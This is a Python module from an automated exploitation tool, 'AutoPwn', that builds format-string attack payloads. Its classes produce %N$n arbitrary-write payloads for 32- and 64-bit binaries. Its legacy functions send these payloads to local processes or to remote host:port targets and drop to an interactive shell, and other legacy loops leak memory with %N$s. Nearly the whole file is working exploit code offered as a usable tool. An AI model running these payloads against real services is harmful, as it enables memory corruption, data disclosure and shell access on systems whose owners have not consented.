"""AutoPwn primitives layer: format-string payload builders (P6.7).

Replaces the v3.1 monolith's ``system_fmtstr`` (local) +
``system_fmtstr_remote`` (remote) + ``fmtstr_print_strings`` (local) +
``fmtstr_print_strings_remote`` (remote) payload-construction blocks
(see ``autopwn/_legacy.py`` L863-894 + L1224-1275) with two typed
:class:`ExploitPrimitive` subclasses that emit the final format-string
payload bytes.

Per ``rebuild.md`` §6.7 P6.7 + ``refactor.md`` §3.2.2, this is the
**only primitive** that uses ``%n`` (the "write count of chars
printed so far to a memory address" format specifier) to perform an
**arbitrary-address write** via the format-string vulnerability.  The
exploitation flow in v3.1 is:

    1. P5.2 ``detect/fmtstr.find_offset`` returns the 1-based offset
       at which user input appears on the stack.
    2. P4.5 ``recon/bss.find_bss`` returns a writable BSS symbol that
       is then used as the write target.
    3. The strategy (P7) calls this primitive to build a payload
       that overwrites the function pointer at the BSS address with
       a small value (the count of bytes printed so far — typically
       the 4/8 bytes of the address itself), effectively turning
       that pointer into a ``system``-like target via additional
       interaction rounds handled by the strategy.

Public API
----------
* :class:`FmtstrX32` — 32-bit format-string payload builder.
  * ``build_payload(ctx) -> bytes`` — emits
    ``p32(buf_addr) + b'%' + str(offset).encode() + b'$n'``.
* :class:`FmtstrX64` — 64-bit format-string payload builder.
  * ``build_payload(ctx) -> bytes`` — same shape with ``p64`` for
    the address.
* :func:`_resolve_fmtstr_inputs` — shared helper that returns
  ``(buf_addr, offset)`` or ``(None, None)`` if either is missing.

Why two bit-widths
------------------
v3.1 conflated the local/remote distinction with the x32/x64
distinction (``system_fmtstr`` used ``p32`` regardless of the
binary's actual bit-width; ``system_fmtstr_remote`` used ``p64``).
That was a v3.1 implementation bug — primitives are bit-width
concerns, runtime (local vs remote) is a strategy concern.  P6.7
fixes this: the bit-width is read from ``ctx.binary.bit`` and
selects the right ``pNN`` encoder.  P7's strategy will then call
``pwntools.process`` (local) or ``pwntools.remote`` (remote)
identically on the returned bytes.

Legacy ports (parity only)
--------------------------
* :func:`_legacy_system_fmtstr` — verbatim port of v3.1's
  ``system_fmtstr`` (L863-894).  Has 1 caller
  (``_legacy.py`` L3360, the no-canary no-overflow branch).
  Preserves v3.1's print_* output byte-for-byte.
* :func:`_legacy_system_fmtstr_remote` — verbatim port of v3.1's
  ``system_fmtstr_remote`` (L1224-1241).  Has 1 caller
  (``_legacy.py`` L3339).  Preserves v3.1's print_* output and
  the (buggy) p64-for-remote shape.
* :func:`_legacy_fmtstr_print_strings` — verbatim port of v3.1's
  ``fmtstr_print_strings`` (L1243-1258).  The "leak only" branch
  — does 100 sendline calls with ``%N$s`` and prints anything
  non-empty.  Kept for spec parity; P7 strategy will dispatch
  to it when ``has_system=False`` (can't write to a function
  pointer that doesn't have a sensible target).
* :func:`_legacy_fmtstr_print_strings_remote` — verbatim port of
  v3.1's ``fmtstr_print_strings_remote`` (L1260-1275).  Same
  100-sendline loop with ``remote`` I/O.

Design notes
------------
* The pure ``build_payload`` reads **only** ``ctx.fmtstr_offset``
  and ``ctx.fmtstr_buf`` from the run context — both must be
  populated by P5.2 + P4.5 before the strategy can use this
  primitive.  Missing either ⇒ ``b""`` (skip).
* The ``%N$n`` specifier writes a 4-byte (x32) or 8-byte (x64)
  ``int`` to the address at position N on the stack.  v3.1's
  payload places ``buf_addr`` at the start of the format string
  so that position 1 (or whatever offset) contains the address
  pointer — that's the address that ``%N$n`` writes to.
* Canary variants are **out of P6.7 scope** — the format string
  does not corrupt the stack canary, and the BSS write target
  is independent of stack layout.  P7.10 canary strategies don't
  need a fmtstr canary variant.
* The "leak only" branch (``fmtstr_print_strings``) is preserved
  in the legacy port only; the pure builder is not asked to leak
  (that's a detection-time concern, handled by P5.2).
"""
from __future__ import annotations

from typing import Optional, Tuple

from autopwn.context import ExploitContext
from autopwn.primitives.base import ExploitPrimitive


def _resolve_fmtstr_inputs(
    ctx: ExploitContext,
) -> Tuple[Optional[int], Optional[int]]:
    """Pull ``(buf_addr, offset)`` from the run context.

    Returns:
        ``(buf_addr, offset)`` when both are populated, else
        ``(None, None)``.  The two are checked together so
        callers don't have to remember which is which.

    Notes:
        Pure: no ELF parse, no IO, no file access.  Reads only
        the pre-populated ``ctx.fmtstr_*`` fields.  The strategy
        is responsible for calling P5.2 ``find_offset`` and
        P4.5 ``find_bss`` to populate these fields before
        dispatching to :class:`FmtstrX32` / :class:`FmtstrX64`.
    """
    buf_addr = ctx.fmtstr_buf
    offset = ctx.fmtstr_offset
    if buf_addr is None or offset is None:
        return None, None
    if offset <= 0:
        return None, None
    return buf_addr, offset


class FmtstrX32(ExploitPrimitive):
    """32-bit format-string ``%N$n`` write payload builder.

    Payload shape::

        [p32(buf_addr)] [b'%'] [str(offset).encode()] [b'$n']

    The first 4 bytes are the target BSS address (where the
    function pointer to overwrite lives).  ``%N$n`` writes the
    count of characters printed so far (which is the 4 bytes
    of the address itself) to that address as a 4-byte int.

    Requires:
        * ``ctx.binary.bit == 32``
        * ``ctx.fmtstr_offset`` is set (P5.2 ``find_offset``)
        * ``ctx.fmtstr_buf`` is set (P4.5 ``find_bss``)
        * ``ctx.binary.stack_canary`` is ``False`` (canary
          variants are P7.10 — the format-string path is
          independent of the canary, but the v3.1 main() only
          enters the fmtstr branch when ``padding == 0``, which
          is only checked when there's no BOF; P7's strategy
          will respect the same gating via ``requires_padding_zero``).
    """

    name = "fmtstr-x32"

    def build_payload(self, ctx: ExploitContext) -> bytes:
        """Return the 32-bit format-string payload, or ``b""`` if not applicable."""
        from pwn import p32

        if ctx.binary.bit != 32:
            return b""

        buf_addr, offset = _resolve_fmtstr_inputs(ctx)
        if buf_addr is None or offset is None:
            return b""

        return (
            p32(buf_addr)
            + b"%"
            + str(offset).encode()
            + b"$n"
        )


class FmtstrX64(ExploitPrimitive):
    """64-bit format-string ``%N$n`` write payload builder.

    Payload shape::

        [p64(buf_addr)] [b'%'] [str(offset).encode()] [b'$n']

    Same as :class:`FmtstrX32` but with ``p64`` for the 8-byte
    address.  The ``%N$n`` writes a 4-byte ``int`` (POSIX says
    ``%n`` writes ``int`` regardless of host word size) — this
    is a v3.1 detail that's preserved as-is; P7 strategy can
    repeat the write for the upper 4 bytes if needed (out of
    P6.7 scope).

    Requires:
        * ``ctx.binary.bit == 64``
        * ``ctx.fmtstr_offset`` is set (P5.2)
        * ``ctx.fmtstr_buf`` is set (P4.5)
    """

    name = "fmtstr-x64"

    def build_payload(self, ctx: ExploitContext) -> bytes:
        """Return the 64-bit format-string payload, or ``b""`` if not applicable."""
        from pwn import p64

        if ctx.binary.bit != 64:
            return b""

        buf_addr, offset = _resolve_fmtstr_inputs(ctx)
        if buf_addr is None or offset is None:
            return b""

        return (
            p64(buf_addr)
            + b"%"
            + str(offset).encode()
            + b"$n"
        )


# =====================================================================
# Legacy ports (parity only) — preserve v3.1's print_* output verbatim
# =====================================================================

# ``OBSOLETE`` prefix signals: do NOT call these from new code; they
# exist only so the v3.1 monolith's callers (line numbers in
# ``_legacy.py``) can be re-routed byte-for-byte through the new
# primitives if/when P8 orchestrator retires the monolith.  They
# retain the v3.1 IO lifecycle (``process()`` / ``remote()`` /
# ``sendline`` / ``interactive()``) so callers don't have to rewrite
# their flow — they just call the new public API for the payload.

def _legacy_system_fmtstr(program, offset, buf_addr) -> bool:  # noqa: ARG001
    """[OBSOLETE — prefer :class:`FmtstrX32`] Verbatim port of v3.1's ``system_fmtstr`` (L863-894).

    Kept for byte-level parity with v3.1's print_* output.  New
    code should call :class:`FmtstrX32` and feed the returned
    bytes to a P7 strategy's IO loop.

    v3.1's quirk preserved: this local variant always uses
    ``p32`` regardless of the binary's actual bit-width.  v3.1
    only enters this branch for x32 binaries (the main()
    flow selects ``system_fmtstr`` for x32 and
    ``system_fmtstr_remote`` for x64), so the hard-coded
    ``p32`` happens to work in practice.
    """
    from pwn import ELF, p32, process

    from autopwn.core.logging import (
        print_section_header, print_payload,
    )

    print_section_header("EXPLOITATION: Format String - Local")
    print_payload("preparing format string exploit")

    io = process(program)
    ELF(program)  # kept for parity; v3.1 loaded but unused
    buf_addr_int = int(buf_addr, 16)
    buf_addr_bytes = p32(buf_addr_int)
    system_addr_bytes = buf_addr_bytes  # alias (v3.1 quirk: same bytes)
    offset_bytes = str(offset).encode()

    payload = system_addr_bytes + b"%" + offset_bytes + b"$n"
    print_payload(f"payload: {payload}")

    io.sendline(payload)
    io.interactive()
    return True  # unreachable in legacy; kept for type parity


def _legacy_system_fmtstr_remote(program, offset, buf_addr, url, port) -> bool:  # noqa: ARG001
    """[OBSOLETE — prefer :class:`FmtstrX64`] Verbatim port of v3.1's ``system_fmtstr_remote`` (L1224-1241).

    v3.1's quirk preserved: this remote variant always uses
    ``p64`` regardless of the binary's actual bit-width.  Same
    justification as :func:`_legacy_system_fmtstr` — the main()
    flow only routes x64 binaries here, so it works in practice.
    """
    from pwn import ELF, p64, remote

    from autopwn.core.logging import (
        print_section_header, print_payload, print_critical,
    )

    print_section_header("EXPLOITATION: Format String - Remote")
    print_payload("preparing format string exploit")

    io = remote(url, port)
    ELF(program)  # kept for parity; v3.1 loaded but unused
    buf_addr_int = int(buf_addr, 16)
    buf_addr_bytes = p64(buf_addr_int)
    system_addr_bytes = buf_addr_bytes  # alias (v3.1 quirk: same bytes)
    offset_bytes = str(offset).encode()

    payload = system_addr_bytes + b"%" + offset_bytes + b"$n"
    print_payload(f"payload: {payload}")

    io.sendline(payload)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()
    return True  # unreachable in legacy; kept for type parity


def _legacy_fmtstr_print_strings(program) -> None:
    """[OBSOLETE] Verbatim port of v3.1's ``fmtstr_print_strings`` (L1243-1258).

    The "leak only" branch — does 100 sendline calls with
    ``%N$s`` and prints anything non-empty.  Pure IO; not
    represented in the P6.7 public API because the leak
    detection is a P5.2 concern.
    """
    from pwn import context, ELF, process

    from autopwn.core.logging import Colors, print_info, print_section_header

    print_section_header("FORMAT STRING LEAK - Local")
    print_info("leaking program strings using format string")
    context.binary = ELF(program, checksec=False)

    for i in range(100):
        try:
            io = process(program, level="error")
            io.sendline(f"%{i}$s".encode())
            result = io.recv()
            if result and len(result.strip()) > 0:
                print_info(f"offset {i}: {Colors.YELLOW}{result}{Colors.END}")
            io.close()
        except EOFError:
            pass


def _legacy_fmtstr_print_strings_remote(program, url, port) -> None:
    """[OBSOLETE] Verbatim port of v3.1's ``fmtstr_print_strings_remote`` (L1260-1275).

    Same 100-sendline loop as :func:`_legacy_fmtstr_print_strings`
    but with ``remote`` I/O instead of ``process``.
    """
    from pwn import context, ELF, remote

    from autopwn.core.logging import Colors, print_info, print_section_header

    print_section_header("FORMAT STRING LEAK - Remote")
    print_info(f"leaking program strings from {url}:{port}")
    context.binary = ELF(program, checksec=False)

    for i in range(100):
        try:
            io = remote(url, port)
            io.sendline(f"%{i}$s".encode())
            result = io.recv()
            if result and len(result.strip()) > 0:
                print_info(f"offset {i}: {Colors.YELLOW}{result}{Colors.END}")
            io.close()
        except EOFError:
            pass


__all__ = [
    "FmtstrX32",
    "FmtstrX64",
    "_resolve_fmtstr_inputs",
    "_legacy_system_fmtstr",
    "_legacy_system_fmtstr_remote",
    "_legacy_fmtstr_print_strings",
    "_legacy_fmtstr_print_strings_remote",
]
